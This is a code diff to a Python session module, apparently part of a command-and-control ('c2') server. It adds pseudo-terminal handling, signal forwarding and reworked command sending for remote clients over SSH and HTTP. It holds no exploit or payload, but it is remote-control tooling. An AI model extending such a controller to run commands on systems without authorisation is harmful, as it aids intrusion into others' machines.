@@ -1,10 +1,99 @@
 import logging
-from typing import Tuple, Optional, Dict, Any
+import signal
+import select
+import termios
+import fcntl
+import struct
+import os
+from typing import Tuple, Optional, Dict, Any, List
 import json
 import time
 import uuid
 
 logger = logging.getLogger('c2.session')
+
+class PTYHandler:
+    """Handles PTY-specific functionality for SSH sessions"""
+    
+    # ANSI control sequences
+    ANSI_CLEAR = b"\x1b[2J\x1b[H"
+    ANSI_RESET = b"\x1b[0m"
+    
+    # Common signal mappings
+    SIGNAL_MAP = {
+        signal.SIGINT: b"\x03",   # Ctrl+C
+        signal.SIGTSTP: b"\x1a",  # Ctrl+Z
+        signal.SIGQUIT: b"\x1c",  # Ctrl+\
+        signal.SIGTERM: b"\x04",  # Ctrl+D (EOF)
+    }
+    
+    def __init__(self, channel):
+        self.channel = channel
+        self.window_size = (80, 24)  # Default terminal size
+        self.term_type = "xterm"     # Default terminal type
+    
+    def set_terminal_settings(self, term_type: str, width: int, height: int):
+        """Configure terminal settings"""
+        self.term_type = term_type
+        self.window_size = (width, height)
+        if self.channel:
+            self.channel.resize_pty(width=width, height=height)
+    
+    def send_signal(self, sig: int) -> bool:
+        """Send a signal to the remote PTY session"""
+        if not self.channel or not self.channel.active:
+            return False
+            
+        try:
+            if sig in self.SIGNAL_MAP:
+                self.channel.send(self.SIGNAL_MAP[sig])
+                return True
+            else:
+                logger.warning(f"Unsupported signal: {sig}")
+                return False
+        except Exception as e:
+            logger.error(f"Failed to send signal {sig}: {e}")
+            return False
+    
+
+    def read_with_timeout(self, timeout: float = 0.5) -> str:
+        """Read from PTY with timeout to prevent blocking"""
+        if not self.channel:
+            return ""
+            
+        response = ""
+        end_time = time.time() + timeout
+        
+        while time.time() < end_time:
+            if self.channel.recv_ready():
+                chunk = self.channel.recv(1024).decode(errors='replace')
+                if not chunk:  # Connection closed
+                    break
+                response += chunk
+                # Reset timeout after receiving data to allow for more data
+                end_time = time.time() + 0.1  # Short extension for more chunks
+            else:
+                # Small sleep to prevent CPU spinning
+                time.sleep(0.01)
+                
+        return response
+    
+    def send_command(self, command: str) -> str:
+        """Send a command to the PTY and read response"""
+        if not self.channel or not self.channel.active:
+            return "Error: Channel not active"
+            
+        try:
+            # Ensure command has proper line ending
+            command = command.rstrip('\n') + '\n'
+            self.channel.send(command)
+            
+            # Read response with timeout
+            return self.read_with_timeout()
+            
+        except Exception as e:
+            logger.error(f"PTY command error: {e}")
+            raise
 
 class ClientSession:
     """Represents a connected client session"""
@@ -20,13 +109,22 @@ class ClientSession:
         self.hostname = None
         self.pty_enabled = pty_enabled
         self.term_settings = term_settings or {}
-        self._parse_client_info()
         self.username = None
         self.os_type = None
         self.connect_time = time.time()
         self.last_seen = time.time()
         self.capabilities = []
         self._parse_client_info()
+        
+        # Initialize PTY handler if PTY is enabled
+        self.pty_handler = None
+        if self.pty_enabled and self.channel:
+            self.pty_handler = PTYHandler(self.channel)
+            self.pty_handler.set_terminal_settings(
+                term_type=self.term_settings.get('term', 'xterm'),
+                width=self.term_settings.get('width', 80),
+                height=self.term_settings.get('height', 24)
+            )
     
     def _parse_client_info(self):
         """Parse the client info string to extract client details"""
@@ -82,7 +180,15 @@ class ClientSession:
             return False
             
         try:
-            self.channel.resize_pty(width=width, height=height)
+            if self.pty_handler:
+                self.pty_handler.set_terminal_settings(
+                    term_type=self.term_settings.get('term', 'xterm'),
+                    width=width,
+                    height=height
+                )
+            else:
+                self.channel.resize_pty(width=width, height=height)
+                
             self.term_settings['width'] = width
             self.term_settings['height'] = height
             logger.debug(f"Resized PTY to {width}x{height}")
@@ -90,6 +196,16 @@ class ClientSession:
         except Exception as e:
             logger.error(f"Failed to resize PTY: {e}")
             return False
+            
+    def send_signal(self, sig: int) -> bool:
+        """Send a signal to the client session"""
+        if not self.pty_enabled:
+            return False
+            
+        if self.pty_handler:
+            return self.pty_handler.send_signal(sig)
+        return False
+    
     def update_last_seen(self):
         """Update the last seen timestamp"""
         self.last_seen = time.time()
@@ -108,7 +224,6 @@ class ClientSession:
             logger.error(f"Error disconnecting client: {e}")
             return False
     
-
     def send_command(self, command: str) -> Optional[str]:
         """Send a command to the client and get response"""
         try:
@@ -126,44 +241,34 @@ class ClientSession:
             self.is_active = False
             return f"Error: {str(e)}"
     
+    
     def _send_ssh_command(self, command: str) -> str:
-        """Send command via SSH channel"""
         try:
             if not self.channel or not self.channel.active:
                 raise Exception("Channel not active")
-                
+
             if self.pty_enabled:
-                # For PTY sessions, properly format command and handle output
-                command = command.strip() + '\r'  # Use \r instead of \n for Windows
-                self.channel.send(command)
+                command = command.rstrip('\n') + '\r\n'
+                self.channel.send(command.encode())
                 
-                # More sophisticated buffered reading for PTY mode
                 response = ''
-                timeout = time.time() + 2.0  # Longer initial timeout
-                accumulated_data = False
+                max_wait = 1.0  # Longer initial timeout
+                start_time = time.time()
                 
-                while True:
+                while time.time() - start_time < max_wait:
                     if self.channel.recv_ready():
                         chunk = self.channel.recv(1024).decode(errors='replace')
                         response += chunk
-                        timeout = time.time() + 0.2  # Reset timeout after receiving data
-                        accumulated_data = True
-                    elif accumulated_data and time.time() > timeout:
-                        # Only break if we've received some data and hit timeout
-                        break
-                    elif not accumulated_data and time.time() > timeout:
-                        # Initial timeout without data
-                        break
+                        # Extend timeout when receiving data
+                        max_wait = time.time() - start_time + 0.2
                     else:
-                        time.sleep(0.005)  # Shorter sleep interval
+                        time.sleep(0.05)
                 
-                # Clean up the response
-                response = self._clean_pty_response(response, command)
                 self.update_last_seen()
                 return response
             else:
-                # Non-PTY mode remains the same
-                self.channel.send(command)
+                # Non-PTY mode
+                self.channel.send(command.encode())
                 response = self.channel.recv(16384).decode(errors='replace')
                 self.update_last_seen()
                 return response
@@ -172,34 +277,6 @@ class ClientSession:
             logger.error(f"SSH command error: {e}")
             self.is_active = False
             raise
-
-    def _clean_pty_response(self, response: str, command: str) -> str:
-        """Clean up PTY response by removing echo and handling prompt"""
-        try:
-            # Split into lines
-            lines = response.split('\r\n')
-            
-            # Remove command echo if present
-            if lines and command.strip() in lines[0]:
-                lines.pop(0)
-            
-            # Remove empty lines from the start
-            while lines and not lines[0].strip():
-                lines.pop(0)
-                
-            # Remove prompt and empty lines from the end
-            while lines and (not lines[-1].strip() or 
-                            self.username in lines[-1] or 
-                            '>' in lines[-1] or 
-                            '$' in lines[-1]):
-                lines.pop()
-                
-            # Rejoin with proper line endings
-            return '\n'.join(lines) + '\n' if lines else ''
-            
-        except Exception as e:
-            logger.error(f"Error cleaning PTY response: {e}")
-            return response
     
     def _send_http_command(self, command: str) -> str:
         """Send command via HTTP channel"""
